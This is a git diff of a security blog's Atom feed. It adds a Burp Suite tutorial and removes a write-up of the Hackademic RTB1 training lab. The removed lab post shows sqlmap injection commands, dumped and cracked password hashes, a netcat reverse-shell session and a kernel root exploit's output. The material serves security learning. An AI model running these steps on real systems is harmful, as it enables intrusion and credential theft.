@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2016-09-12T06:57:15-04:00</updated>
+  <updated>2016-11-22T14:21:15-05:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,174 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Introduction to Burp Suite]]></title>
+    <link href="http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite/"/>
+    <updated>2016-11-19T17:01:23-05:00</updated>
+    <id>http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite</id>
+    <content type="html"><![CDATA[<p>Yes, the time has come for a full post on Burp Suite! I have delayed it for too long!</p>
+
+<p>Before starting, here are some resources for learning about Burp:</p>
+
+<p><a href="https://portswigger.net/burp/help/contents.html">Burp Suite Documentation</a></p>
+
+<p><a href="http://aetherlab.teachable.com/p/burp-suite">Free introductory course on Burp Suite</a></p>
+
+<p><a href="https://vimeo.com/album/3510171">Burp Suite for Web Application Security</a></p>
+
+<!-- more -->
+
+
+<p>Burp Suite is the primary tool used for performing web application security assessments. It acts as a proxy between your browser and the target, and it comes packed with powerful features to assist in penetration testing: spidering fuctionality, web scanning for vulnerabilities (pro version only), tools that allow you to perform different actions with web requests (will be covered in detail below), and customization ability through plugins.</p>
+
+<h1>Introduction to Burp Suite</h1>
+
+<p>Burp is a Java application, so you need to have Java installed (version 1.6 or later) to run it. It comes pre-installed in Kali, where you can find it in the Web Application Analysis category.</p>
+
+<p>To use Burp, you need to configure your browser&rsquo;s proxy settings. Burp&rsquo;s proxy is listening on 127.0.0.1:8080. If you want to manually configure your browser to use it, refer to this <a href="https://portswigger.net/burp/help/suite_gettingstarted.html">getting started post</a>. I recommend using a browser add-on like <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to set up your proxies and toggle them with a click.</p>
+
+<p>For <strong>Burp to work with HTTPS</strong> requests, you need to add Burp&rsquo;s CA certificate to your browser. Go to <a href="http://burp/">http://burp/</a> and click on CA Certificate to download it to your computer. In this demo I&rsquo;m using Firefox, but the steps should be similar in the rest of the browsers. In the Firefox menu, select Options or Preferences, then go to Advanced &ndash;> Certificates &ndash;> View Certificates. Click on the Authorities tab and choose Import to select your CA certificate, and check the option &ldquo;Trust this CA to identify web sites&rdquo;. Then click Ok, and restart Firefox. Burp should work now with HTTPS traffic, without issuing any security warnings.</p>
+
+<h1>Burp Suite components</h1>
+
+<p>The power of Burp comes from the interaction between its components, which you can individually access from the application tabs. Let&rsquo;s see each of them in action!</p>
+
+<h2>Target</h2>
+
+<p>Here you can see information about your target. The site map constructs a hierarchical representation of your target. Items requested are shown in black, those that Burp inferred from links etc. are in gray. As you browse with the proxy on, Burp will keep building the site map.</p>
+
+<p><img class="center" src="/images/tools/burp/sitemap.png" title="&lsquo;sitemap&rsquo; &lsquo;target sitemap&rsquo;" ></p>
+
+<p>You can configure the scope of your targets from the Scope tab. Alternately, you can right-click on the sitemap entries to perform other actions:</p>
+
+<p><img class="center" src="/images/tools/burp/sitemap-menu.png" title="&lsquo;sitemap menu&rsquo; &lsquo;target sitemap menu&rsquo;" ></p>
+
+<p>Clicking on the Filter bar lets you customize filtering options. Before starting the demo, I added my target to the scope and selected to hide the out-of scope items for a clearer view.</p>
+
+<p><img class="center" src="/images/tools/burp/sitemap-filter.png" title="&lsquo;sitemap filter&rsquo; &lsquo;target sitemap filter&rsquo;" ></p>
+
+<h2>Proxy</h2>
+
+<p>This is the component that allows you to intercept and modify the requests between your browser and the target. You will get familiar with the Intercept tab, where you can inspect each request and response, modify it, or send it to other tools. The history tabs keep records for the HTTP and WebSockets messages. In the Options tab you have a plethora of configuration options for your Proxy. Take special note of the Response Modification options, which you can use to automatically modify the responses HTML to remove client-side logic and controls, or perform SSL stripping.</p>
+
+<p><img class="center" src="/images/tools/burp/proxy-options.png" title="&lsquo;proxy response options&rsquo; &lsquo;response modification options&rsquo;" ></p>
+
+<p>Right-clicking in the Raw tab will give you more options, among which there are some very useful ones such as copying the request as a Curl command, or constructing selected strings in Javascript and SQL (MySQL, Oracle, MS-SQL)</p>
+
+<h2>Spider</h2>
+
+<p>You can use Burp&rsquo;s spider to automatically crawl target applications. After you&rsquo;ve manually browsed the application, right-click the host or URL that you want to crawl in the site map, and choose &ldquo;Spider this host / branch&rdquo;. Then watch the number of requests being made in the Control tab. You can customize the spider in the Options tab. Passive spidering is enabled by default, allowing Burp to update the site map while you are manually browsing. Also, you can specify what the spider should do when encountering forms (ignoring them, automatically submitting with pre-determined values, prompting for guidance etc.) Be careful, as the spider may perform actions with repercussions on the target application, so an initial manual assessment followed by a strict configuration of the spidering scope would be preferred.</p>
+
+<h2>Scanner</h2>
+
+<p>Burp has an automatic vulnerability scanner <em>uncontrolled drooling</em> that seems excellent from the reviews, but it&rsquo;s only available for Pro users. If you look in the Issue definitions tab, you can see the <a href="https://portswigger.net/KnowledgeBase/Issues/">vulnerabilites that Burp can detect</a>, among with a description for each of them <em>drooling intensifies</em></p>
+
+<p><img class="center" src="/images/tools/burp/scanner.png" title="&lsquo;burp scanner&rsquo; &lsquo;burp web scanner&rsquo;" ></p>
+
+<h2>Intruder</h2>
+
+<p>With Burp Intruder you can perform highly-customized automated attacks against your targets, including brute forcing, fuzzing, enumeration etc. Usually, you select an interesting request and send it to Intruder. You can see the positions where payloads will be placed, marked in orange in this dummy request:</p>
+
+<p><img class="center" src="/images/tools/burp/intruder-position.png" title="&lsquo;intruder positions&rsquo; &lsquo;intruder payload positions&rsquo;" ></p>
+
+<h3>Attack types</h3>
+
+<p>In the Position tab, you can also choose the type of attack you want to perform:</p>
+
+<ul>
+<li><p><strong>Sniper</strong> &ndash; single set of payloads, places each payload into each position in turn, useful for individual parameter fuzzing</p></li>
+<li><p><strong>Battering ram</strong> &ndash; single set of payloads, places the the same payload into all positions at the same time</p></li>
+<li><p><strong>Pitchfork</strong> &ndash; multiple payload sets, different payload set for each position</p></li>
+<li><p><strong>Cluster bomb</strong> &ndash; multiple payload sets, tests all permutations of the payload combinations, so depending on your payloads, this attack might grow to gigantic proportions</p></li>
+</ul>
+
+
+<h3>Payload types</h3>
+
+<p>You have lots of payload types available for testing, so choose what is appropriate for your target:</p>
+
+<ul>
+<li><p><strong>Simple list</strong> &ndash; list of strings</p></li>
+<li><p><strong>Runtime file</strong> &ndash; read strings at runtime from a file (for very large lists)</p></li>
+<li><p><strong>Custom iterator</strong> &ndash; permutations of characters in multiple lists</p></li>
+<li><p><strong>Character substitution</strong> &ndash; substitute characters, for instance when you are testing for 53cur3 p455w0rd5</p></li>
+<li><p><strong>Case modification</strong> &ndash; change the characters' case according to the pre-defined rules</p></li>
+<li><p><strong>Recursive grep</strong> &ndash; recursively extract data from the responses of previous requests</p></li>
+<li><p><strong>Illegal Unicode</strong> &ndash; by using illegal Unicode representations, it might be possible to bypass filters etc.</p></li>
+<li><p><strong>Character blocks</strong> &ndash; creates blocks of characters of specified sizes, can aid in detecting buffer overflows</p></li>
+<li><p><strong>Numbers</strong> &ndash; numeric payloads</p></li>
+<li><p><strong>Dates</strong> &ndash; date values</p></li>
+<li><p><strong>Brute forcer</strong> &ndash; sets of permutations generated from specified characters</p></li>
+<li><p><strong>Null payloads</strong> &ndash; empty string payloads</p></li>
+<li><p><strong>Character frobber</strong> &ndash; changes the value of each character in turn, useful for determining what characters are being used for session tokens etc.</p></li>
+<li><p><strong>Bit flipper</strong> &ndash; flips individual bits in the payload</p></li>
+<li><p><strong>Username generator</strong> &ndash; generates usernames from the given input</p></li>
+<li><p><strong>ECB block shuffler</strong> &ndash; shuffles ECB-encrypted blocks</p></li>
+<li><p><strong>Extension generated</strong> &ndash; uses an extension to create the payloads</p></li>
+<li><p><strong>Copy other payload</strong> &ndash; copies the current payload value to a different position</p></li>
+</ul>
+
+
+<h2>Repeater</h2>
+
+<p>This tool is useful for sending requests over and over to the target application.</p>
+
+<p><img class="center" src="/images/tools/burp/repeater.png" title="&lsquo;repeater&rsquo; &lsquo;repeater&rsquo;" ></p>
+
+<h2>Sequencer</h2>
+
+<p>With the Sequencer tool you can test for the randomness of data tokens in an target application. The analysis is more accurate if the number of captured tokens is larger.</p>
+
+<p><img class="center" src="/images/tools/burp/sequencer.png" title="&lsquo;Burp sequencer&rsquo; &lsquo;Burp sequencer&rsquo;" ></p>
+
+<h2>Decoder</h2>
+
+<p>The Decoder tool performs encoding and decoding of different data formats, such as HTML, URL, Base64, ASCII hex, Hex, Octal, Binary, Gzip, and it also has hashing functionality for MD2, SHA-224, MD5, SHA1, SHA-384, SHA, SHA-512 and SHA-256.</p>
+
+<p><img class="center" src="/images/tools/burp/decoder.png" title="&lsquo;Burp decoder&rsquo; &lsquo;Burp decoder&rsquo;" ></p>
+
+<h2>Comparer</h2>
+
+<p>If you want to compare different responses, this tool gives you the options of words or bytes comparison</p>
+
+<p><img class="center" src="/images/tools/burp/comparer.png" title="&lsquo;Burp comparer&rsquo; &lsquo;Burp comparer&rsquo;" ></p>
+
+<h2>Extender</h2>
+
+<p>Here you can add extensions to Burp that add more functionality than what is available by default. Take a look at what extensions you can find in the BApp Store:</p>
+
+<p><img class="center" src="/images/tools/burp/extensions.png" title="&lsquo;burp extensions&rsquo; &lsquo;burp extensions&rsquo;" ></p>
+
+<p>In this screenshot I am sorting by rating. There are many extensions available and I suggest looking at each and determining if you will need it before choosing to install.</p>
+
+<h3>Burp Clickbandit</h3>
+
+<p>We&rsquo;re done with the main tools, but Burp has more. It even includes a cool tool for creating clickjacking attacks.</p>
+
+<p><img class="center" src="/images/tools/burp/clickbandit.png" title="&lsquo;burp clickbandit&rsquo; &lsquo;burp clickbandit&rsquo;" ></p>
+
+<p>In a future post I will do a lab featuring Burp&rsquo;s capabilities that I&rsquo;ve enumerated so far. Expect some Mutillidae! :&ndash;)</p>
+
+<p>``` plain</p>
+
+<hr />
+
+<p>/ Don&rsquo;t you wish you had more energy&hellip; \
+\ or less ambition?                     /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest tools - Dirbuster]]></title>
@@ -473,9 +641,9 @@ given company search string. Updates the respective tables with the results.</p>
 [<em>] Netblock: 64.56.197.208/28
 [</em>] Netblock: 67.72.118.0/23
 [<em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-1/pocs">http://whois.arin.net/rest/org/YAHOO-1/pocs</a>
-[</em>] Contact: Netblock Admin (<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x6e;&#101;&#116;&#x62;&#x6c;&#x6f;&#x63;&#x6b;&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#121;&#x61;&#x68;&#111;&#111;&#x2d;&#x69;&#x6e;&#99;&#46;&#x63;&#111;&#109;">&#x6e;&#x65;&#116;&#98;&#108;&#x6f;&#99;&#x6b;&#97;&#x64;&#109;&#x69;&#110;&#64;&#x79;&#x61;&#104;&#x6f;&#x6f;&#45;&#x69;&#x6e;&#99;&#46;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Admin) (Sunnyvale, CA &ndash; United States)
-[<em>] Contact: Netblock Admin (<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#110;&#101;&#116;&#x62;&#x6c;&#111;&#99;&#x6b;&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#121;&#x61;&#104;&#x6f;&#x6f;&#45;&#105;&#x6e;&#99;&#46;&#99;&#111;&#x6d;">&#110;&#101;&#x74;&#x62;&#x6c;&#x6f;&#x63;&#107;&#97;&#100;&#109;&#105;&#110;&#x40;&#x79;&#x61;&#x68;&#x6f;&#x6f;&#x2d;&#x69;&#x6e;&#99;&#46;&#x63;&#x6f;&#109;</a>) &ndash; Whois contact (Tech) (Sunnyvale, CA &ndash; United States)
-[</em>] Contact: Network Abuse (<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x61;&#98;&#117;&#x73;&#101;&#64;&#x79;&#97;&#104;&#x6f;&#111;&#45;&#105;&#x6e;&#x63;&#x2e;&#99;&#x6f;&#109;">&#97;&#x62;&#x75;&#115;&#x65;&#x40;&#x79;&#x61;&#104;&#x6f;&#111;&#45;&#x69;&#110;&#99;&#46;&#99;&#x6f;&#x6d;</a>) &ndash; Whois contact (Abuse) (Sunnyvale, CA &ndash; United States)</p>
+[</em>] Contact: Netblock Admin (<a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#110;&#101;&#116;&#98;&#108;&#111;&#x63;&#x6b;&#x61;&#x64;&#x6d;&#105;&#x6e;&#x40;&#121;&#97;&#x68;&#x6f;&#x6f;&#45;&#x69;&#x6e;&#99;&#x2e;&#x63;&#111;&#x6d;">&#x6e;&#101;&#116;&#98;&#108;&#111;&#99;&#x6b;&#97;&#100;&#109;&#x69;&#110;&#x40;&#x79;&#97;&#x68;&#111;&#111;&#x2d;&#x69;&#x6e;&#99;&#46;&#99;&#111;&#109;</a>) &ndash; Whois contact (Admin) (Sunnyvale, CA &ndash; United States)
+[<em>] Contact: Netblock Admin (<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#110;&#101;&#116;&#x62;&#x6c;&#111;&#x63;&#x6b;&#97;&#x64;&#109;&#x69;&#x6e;&#x40;&#x79;&#x61;&#x68;&#111;&#111;&#x2d;&#105;&#110;&#x63;&#x2e;&#99;&#111;&#109;">&#110;&#101;&#x74;&#x62;&#x6c;&#x6f;&#x63;&#107;&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#121;&#x61;&#104;&#x6f;&#111;&#45;&#105;&#110;&#99;&#46;&#x63;&#x6f;&#x6d;</a>) &ndash; Whois contact (Tech) (Sunnyvale, CA &ndash; United States)
+[</em>] Contact: Network Abuse (<a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#97;&#x62;&#x75;&#115;&#x65;&#x40;&#121;&#x61;&#x68;&#111;&#111;&#x2d;&#x69;&#110;&#99;&#x2e;&#99;&#x6f;&#x6d;">&#x61;&#x62;&#117;&#115;&#101;&#64;&#x79;&#97;&#104;&#111;&#x6f;&#45;&#x69;&#110;&#x63;&#x2e;&#99;&#111;&#x6d;</a>) &ndash; Whois contact (Abuse) (Sunnyvale, CA &ndash; United States)</p>
 
 <hr />
 
@@ -485,9 +653,9 @@ given company search string. Updates the respective tables with the results.</p>
 [</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/nets">http://whois.arin.net/rest/org/YAHOO-10/nets</a>
 [<em>] Netblock: 12.23.247.176/29
 [</em>] URL: <a href="http://whois.arin.net/rest/org/YAHOO-10/pocs">http://whois.arin.net/rest/org/YAHOO-10/pocs</a>
-[<em>] Contact: Janice Kilburn (<a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#x6b;&#x69;&#108;&#98;&#x75;&#x72;&#x6e;&#x31;&#115;&#116;&#x6f;&#x70;&#64;&#121;&#97;&#x68;&#x6f;&#111;&#x2e;&#x63;&#x6f;&#109;">&#106;&#107;&#105;&#108;&#x62;&#x75;&#114;&#x6e;&#49;&#115;&#116;&#111;&#112;&#64;&#x79;&#x61;&#x68;&#x6f;&#111;&#46;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Admin) (Lawrenceburg, TN &ndash; United States)
-[</em>] Contact: Janice Kilburn (<a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#107;&#105;&#x6c;&#x62;&#x75;&#x72;&#x6e;&#x31;&#x73;&#x74;&#x6f;&#112;&#x40;&#x79;&#x61;&#x68;&#x6f;&#x6f;&#x2e;&#x63;&#111;&#x6d;">&#106;&#x6b;&#x69;&#x6c;&#98;&#117;&#x72;&#x6e;&#x31;&#x73;&#x74;&#x6f;&#112;&#x40;&#121;&#97;&#104;&#x6f;&#x6f;&#x2e;&#x63;&#x6f;&#x6d;</a>) &ndash; Whois contact (Abuse) (Lawrenceburg, TN &ndash; United States)
-[<em>] Contact: Janice Kilburn (<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#106;&#107;&#x69;&#x6c;&#x62;&#x75;&#x72;&#110;&#49;&#x73;&#x74;&#111;&#112;&#64;&#x79;&#97;&#104;&#x6f;&#x6f;&#x2e;&#99;&#x6f;&#109;">&#x6a;&#107;&#105;&#x6c;&#98;&#x75;&#x72;&#110;&#49;&#x73;&#x74;&#x6f;&#112;&#64;&#x79;&#97;&#x68;&#111;&#x6f;&#x2e;&#99;&#x6f;&#109;</a>) &ndash; Whois contact (Tech) (Lawrenceburg, TN &ndash; United States)
+[<em>] Contact: Janice Kilburn (<a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#x6a;&#x6b;&#105;&#108;&#98;&#x75;&#x72;&#x6e;&#x31;&#x73;&#x74;&#111;&#112;&#64;&#121;&#x61;&#104;&#x6f;&#x6f;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#107;&#x69;&#108;&#x62;&#x75;&#114;&#x6e;&#49;&#x73;&#x74;&#111;&#112;&#64;&#x79;&#x61;&#x68;&#x6f;&#111;&#x2e;&#x63;&#111;&#x6d;</a>) &ndash; Whois contact (Admin) (Lawrenceburg, TN &ndash; United States)
+[</em>] Contact: Janice Kilburn (<a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x6a;&#x6b;&#x69;&#108;&#x62;&#x75;&#x72;&#110;&#49;&#115;&#x74;&#x6f;&#112;&#x40;&#x79;&#97;&#104;&#111;&#x6f;&#x2e;&#x63;&#111;&#x6d;">&#106;&#107;&#105;&#x6c;&#x62;&#x75;&#x72;&#110;&#49;&#115;&#116;&#111;&#x70;&#x40;&#121;&#x61;&#x68;&#111;&#x6f;&#46;&#99;&#111;&#x6d;</a>) &ndash; Whois contact (Abuse) (Lawrenceburg, TN &ndash; United States)
+[<em>] Contact: Janice Kilburn (<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#x6a;&#107;&#x69;&#x6c;&#98;&#x75;&#x72;&#x6e;&#x31;&#x73;&#x74;&#x6f;&#112;&#64;&#121;&#97;&#104;&#x6f;&#111;&#x2e;&#x63;&#111;&#x6d;">&#106;&#x6b;&#105;&#x6c;&#98;&#117;&#x72;&#110;&#49;&#115;&#x74;&#x6f;&#112;&#64;&#121;&#x61;&#104;&#111;&#111;&#x2e;&#99;&#111;&#109;</a>) &ndash; Whois contact (Tech) (Lawrenceburg, TN &ndash; United States)
 [</em>] URL: <a href="http://whois.arin.net/rest/customers;name=yahoo">http://whois.arin.net/rest/customers;name=yahoo</a></p>
 
 <hr />
@@ -1748,177 +1916,6 @@ decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
 <p>``` plain
 / You are only young once, but you can \
 \ stay immature indefinitely.          /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
-    <link href="http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1/"/>
-    <updated>2016-07-18T09:00:59-04:00</updated>
-    <id>http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1</id>
-    <content type="html"><![CDATA[<h1>Mission statement</h1>
-
-<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>
-
-<!-- more -->
-
-
-<h1>Recon</h1>
-
-<p>I started with a port scan of the target, but only the 80 port is open:</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb1-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>
-
-<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb1-sqli.png" title="&lsquo;sqli&rsquo; &lsquo;sql error&rsquo;" ></p>
-
-<h1>Exploit</h1>
-
-<p>Next I enumerated the databases with Sqlmap:</p>
-
-<p><code>plain
-sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL --dbs
-available databases [3]:
-[*] information_schema
-[*] mysql
-[*] wordpress
-</code></p>
-
-<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>
-
-<p><code>plain
-sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL -D wordpress --tables
-Database: wordpress
-[9 tables]
-+-------------------+
-| wp_categories     |
-| wp_comments       |
-| wp_linkcategories |
-| wp_links          |
-| wp_options        |
-| wp_post2cat       |
-| wp_postmeta       |
-| wp_posts          |
-| wp_users          |
-+-------------------+
-</code></p>
-
-<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>
-
-<p><code>plain
-user_pass               user_login
-21232f297a57a5a743894a0e4a801fc3    NickJames
-b986448f0bb9e5e124ca91d3d650f52c    JohnSmith
-7cbb3252ba6b7e9c422fac5334d22054    GeorgeMiller
-a6e514f9486b83cb53d8d932f9a04292    TonyBlack
-8601f6e1028a8e8a966f6c33fcd9aec4    JasonKonnors
-50484c19f1afdaf3841a0d821ed393d2    MaxBucky
-</code></p>
-
-<p>Cracking the hashes revealed the passwords of all the users:</p>
-
-<p><code>plain
-admin
-PUPPIES
-q1w2e3
-napoleon
-maxwell
-kernel
-</code></p>
-
-<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb1-panel.png" title="&lsquo;dashboard&rsquo; &lsquo;admin panel&rsquo;" ></p>
-
-<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb1-404.png" title="&lsquo;404.php&rsquo; &lsquo;php file edited&rsquo;" ></p>
-
-<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>
-
-<p><code>plain
-nc -vnlp 5555
-listening on [any] 5555 ...
-connect to [192.168.80.161] from (UNKNOWN) [192.168.80.162] 50723
-Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
- 13:23:45 up  3:04,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=48(apache) gid=489(apache) groups=489(apache)
-sh: no job control in this shell
-</code></p>
-
-<h2>Privilege escalation</h2>
-
-<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>
-
-<p>``` plain
-sh-4.0$ ./rds
-./rds
-[<em>] Linux kernel >= 2.6.30 RDS socket exploit
-[</em>] by Dan Rosenberg
-[<em>] Resolving kernel addresses&hellip;
- [+] Resolved security_ops to 0xc0aa19ac
- [+] Resolved default_security_ops to 0xc0955c6c
- [+] Resolved cap_ptrace_traceme to 0xc055d9d7
- [+] Resolved commit_creds to 0xc044e5f1
- [+] Resolved prepare_kernel_cred to 0xc044e452
-[</em>] Overwriting security ops&hellip;
-[<em>] Linux kernel >= 2.6.30 RDS socket exploit
-[</em>] by Dan Rosenberg
-[<em>] Resolving kernel addresses&hellip;
- [+] Resolved security_ops to 0xc0aa19ac
- [+] Resolved default_security_ops to 0xc0955c6c
- [+] Resolved cap_ptrace_traceme to 0xc055d9d7
- [+] Resolved commit_creds to 0xc044e5f1
- [+] Resolved prepare_kernel_cred to 0xc044e452
-[</em>] Overwriting security ops&hellip;
-[<em>] Overwriting function pointer&hellip;
-[</em>] Linux kernel >= 2.6.30 RDS socket exploit
-[<em>] by Dan Rosenberg
-[</em>] Resolving kernel addresses&hellip;
- [+] Resolved security_ops to 0xc0aa19ac
- [+] Resolved default_security_ops to 0xc0955c6c
- [+] Resolved cap_ptrace_traceme to 0xc055d9d7
- [+] Resolved commit_creds to 0xc044e5f1
- [+] Resolved prepare_kernel_cred to 0xc044e452
-[<em>] Overwriting security ops&hellip;
-[</em>] Overwriting function pointer&hellip;
-[<em>] Triggering payload&hellip;
-[</em>] Restoring function pointer&hellip;
-id
-uid=0(root) gid=0(root)
-cat /root/key.txt
-Yeah!!
-You must be proud because you &rsquo;ve got the password to complete the First <em>Realistic</em> Hackademic Challenge (Hackademic.RTB1) :)</p>
-
-<p>$<em>d&amp;jgQ>>ak#b"(Hx"o&lt;la</em>%</p>
-
-<p>Regards,
-mr.pr0n || p0wnbox.Team || 2011
-<a href="http://p0wnbox.com">http://p0wnbox.com</a>
-```</p>
-
-<h1>Debriefing</h1>
-
-<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>
-
-<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>
-
-<p>``` plain
-/ Don&rsquo;t relax! It&rsquo;s only your tension \
-\ that&rsquo;s holding you together.        /</p>
 
 <hr />
 
